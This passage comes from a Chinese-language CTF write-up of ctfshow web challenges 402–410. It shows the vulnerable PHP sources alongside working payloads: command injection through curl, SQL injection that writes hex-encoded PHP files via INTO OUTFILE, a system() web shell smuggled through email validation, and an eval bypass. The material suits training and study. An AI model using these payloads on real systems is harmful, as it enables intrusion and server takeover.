class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对host部分ban了<code>; &gt; | base</code>，不影响</p>
</li>
<li><p>web403. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到命令执行语句换成了<code>curl</code></p>
<p>这里复习一下管道符的作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 直接执行后面的语句</span><br><span class="line">|| 如果前面执行的语句出错，则执行后面的语句</span><br><span class="line">&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</span><br><span class="line">&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句</span><br><span class="line">; 执行完前面的再执行后面的</span><br></pre></td></tr></table></figure>

<p>因此只需要构造出符合条件的host，后面拼接另一条命令即可，管道符连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.13.13/xxx;ls&gt;/var/www/html/1.txt</span><br><span class="line">http://192.168.13.13/xxx;cat fl0g.php&gt;/var/www/html/1.txt</span><br></pre></td></tr></table></figure></li>
<li><p>web404 特定函数绕过</p>
</li>
<li><p>web405 特定函数绕过</p>
</li>
</ol>
<p>   源码如下</p>
   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\.|php/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;parse_url 好强大&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">parse_url 好强大</span><br></pre></td></tr></table></figure>

<p>   首先这里schema必须包含<code>php|.|~</code>，经过测试发现<code>httphp</code>也是可以被识别到；</p>
<p>   <img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221118234831733.png" alt="image-20221118234831733"></p>
<p>   path部分严格限制了只能为<code>/字母|数字</code>；host部分正则在结尾多了个<code>.</code>可以利用</p>
<p>   <strong>payload</strong></p>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=httphp://127.0.0.111;echo `cat fl*`&gt;1.txt;1/a</span><br></pre></td></tr></table></figure>

<ol start="11">
<li><p>web406 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 16:00:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="comment">//flag in db</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$url</span>,FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from links where url =&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;不通过&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: url in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">不通过</span><br></pre></td></tr></table></figure>

<p>针对<code>filter_var()</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用特定的过滤器过滤一个变量</span><br><span class="line">参数：FILTER_VALIDATE_URL</span><br><span class="line">optionally with required components. Beware a valid URL may not specify the HTTP protocol http:// so further validation may be required to determine the URL uses an expected protocol, e.g. ssh:// or mailto:. Note that the function will only find ASCII URLs to be valid; internationalized domain names (containing non-ASCII characters) will fail.</span><br></pre></td></tr></table></figure>

<p>注意空格也不能通过解析，因此可以通过<code>/**/</code>绕过。可通过url检测的格式如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com;&lt;payload&gt;;</span><br></pre></td></tr></table></figure>

<p>提示了flag in db，我们想要回显的话可以将其写入到文件中，先判断字段数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com;&#x27;union/**/select/**/1,2/**/into/**/outfile/**/&quot;/var/www/html/9.txt&quot;%23;</span><br></pre></td></tr></table></figure>

<p>字段数为2</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119002316476.png" alt="image-20221119002316476"></p>
<p>接下来就是查表，由于是写入文件，所以这里利用的比较巧妙，我可以先写入一段恶意代码，在其中执行恶意sql语句来绕过直接的url检测，恶意代码只需用编码绕过即可，妙！</p>
<p><strong>恶意代码如下</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">&#x27;config.php&#x27;</span>;<span class="variable">$sql</span>=<span class="string">&#x27;select 1, group_concat(table_name) from information_schema.tables where table_schema=database() into outfile &quot;/var/www/html/9.txt&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其编码后放入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d6461746162617365282920696e746f206f757466696c6520222f7661722f7777772f68746d6c2f382e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/8.php&quot;%23;</span><br></pre></td></tr></table></figure>

<p>麻了这里有很多限制，写过一次好像不能覆盖写</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119005236988.png" alt="image-20221119005236988"></p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require &#x27;config.php&#x27;;$sql=&#x27;select 1, group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot; into outfile &quot;/var/www/html/7.txt&quot;&#x27;;$result=$conn-&gt;query($sql);var_dump($result);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d22666c61672220696e746f206f757466696c6520222f7661722f7777772f68746d6c2f372e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/7.php&quot;%23;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119005536171.png" alt="image-20221119005536171"></p>
<p>查flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require &#x27;config.php&#x27;;$sql=&#x27;select 1, group_concat(flag) from flag into outfile &quot;/var/www/html/6.txt&quot;&#x27;;$result=$conn-&gt;query($sql);var_dump($result);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com;&#x27;union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b2473716c3d2773656c65637420312c2067726f75705f636f6e63617428666c6167292066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f362e74787422273b24726573756c743d24636f6e6e2d3e7175657279282473716c293b7661725f64756d702824726573756c74293b3f3e/**/into/**/outfile/**/&quot;/var/www/html/6.php&quot;%23;</span><br></pre></td></tr></table></figure></li>
<li><p>web407 特定函数绕过，来一杯咖啡？</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 17:24:13</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回顾一下<code>call_user_func()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br></pre></td></tr></table></figure>

<p>这里存在一个cafe类，并且内含静态方法add可以读出flag</p>
<p>针对<code>FILTER_VALIDATE_IP</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Fails validation for the following reserved IPv4 ranges: 0.0.0.0/8, 169.254.0.0/16, 127.0.0.0/8 and 240.0.0.0/4.</span><br><span class="line"></span><br><span class="line">Fails validation for the following reserved IPv6 ranges: ::1/128, ::/128, ::ffff:0:0/96 and fe80::/10.</span><br></pre></td></tr></table></figure>

<p>我们可以尝试IPV6地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cafe::add</span><br></pre></td></tr></table></figure></li>
<li><p>web408 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 19:53:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">1</span>], <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;@&#x27;</span>, <span class="variable">$email</span>)[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次是针对<code>FILTER_VALIDATE_EMAIL</code>，如果通过校验，会将@后面的部分当做文件名，前面部分当做内容，执行文件写操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allows the local part of the email address to contain Unicode characters.</span><br></pre></td></tr></table></figure>

<p>首先针对文件名，可以直接改为任意文件后缀</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119100553369.png" alt="image-20221119100553369"></p>
</li>
</ol>
<p>然后对于前面，如果包含特殊字符，双引号包含下是可以绕过的</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119100807040.png" alt="image-20221119100807040"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?=system($_POST[1])?&gt;&quot;@qq.php</span><br></pre></td></tr></table></figure>

<ol start="14">
<li><p>web409. 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-16 14:58:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-16 20:26:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$email</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$email</span>,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">    <span class="variable">$email</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.flag/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$email</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$email</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会把flag和之前的字符都给过滤掉，我们怎么利用呢？我们想的是通过<code>?&gt;</code>闭合php标签来绕过后面的检测，但是由于前面还存在双引号所以仍然会报错</p>
<p><img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221119102046054.png" alt="image-20221119102046054"></p>
</li>
</ol>
<p>因此 我们想要把前面的”在通过filter检验后过滤掉，就需要用到这个正则替换函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;flagsystem($_GET[1])?&gt;&quot;@1.php</span><br><span class="line">?email=&quot;flagsystem($_GET[1])?&gt;&quot;@1.php&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure>

<ol start="15">
<li><p>web410 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

